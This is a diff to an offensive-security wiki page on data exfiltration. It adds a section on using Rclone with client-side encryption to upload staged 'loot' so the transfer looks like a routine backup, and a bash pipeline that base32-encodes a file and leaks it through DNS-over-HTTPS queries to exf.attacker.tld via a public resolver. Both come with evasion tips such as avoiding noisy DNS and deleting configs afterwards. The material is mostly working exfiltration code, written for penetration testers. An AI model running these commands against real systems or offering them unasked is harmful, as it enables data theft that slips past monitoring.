@@ -241,6 +241,35 @@ Notes:
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
+## Rclone (cloud/object-storage exfiltration)
+
+Modern operators often **stage loot locally** and then use [Rclone](https://rclone.org/) to make the transfer look like a normal backup or sync job. A practical pattern is:
+
+1. A normal remote (`s3`, `webdav`, `drive`, `mega`, ...)
+2. A `crypt` wrapper so **contents and filenames are encrypted client-side**
+3. An optional `chunker` wrapper if the provider enforces object-size limits or you want smaller upload units
+
+```bash
+# 1) Create the storage backend remote (interactive)
+rclone config              # ex: remote
+
+# 2) Wrap it with client-side encryption
+rclone config              # ex: secret -> remote:path
+
+# 3) Optional: create a chunker overlay for large objects
+rclone config              # ex: overlay -> secret:
+
+# 4) Upload staged data
+rclone copy /loot secret:$(hostname)-$(date +%F) \
+  --transfers 2 --checkers 2 --bwlimit 4M
+# If you created the chunker wrapper, upload to overlay:... instead
+```
+
+Notes:
+- `crypt` can encrypt both file contents and names.
+- `chunker` transparently splits large files and reassembles them on download.
+- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards.
+
 ## FTP
 
 ### FTP server (python)
@@ -405,6 +434,25 @@ def process_packet(pkt):
 sniff(iface="tun0", prn=process_packet)
 ```
 
+## DNS over HTTPS (DoH)
+
+If classic UDP/53 DNS is noisy or blocked but outbound HTTPS is broadly allowed, the usual DNS-label exfiltration pattern can be wrapped inside **DoH** requests to a public resolver. Keep each label well below the 63-byte DNS limit and use a DNS-safe alphabet such as Base32.
+
+```bash
+# Encode -> split into DNS-safe labels -> send via DoH
+base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
+  nl -nrz -w4 -s. | while read chunk; do
+    curl --http2 -s \
+      -H 'accept: application/dns-json' \
+      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
+      >/dev/null
+  done
+```
+
+On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.
+
+For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
+
 ## **SMTP**
 
 If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
@@ -517,15 +565,12 @@ wine exe2bat.exe nc.exe nc.txt
 
 Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
 
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
-## DNS
-
-- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
-- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
-
 ## References
 
+- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [goshs](https://github.com/patrickhener/goshs)
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
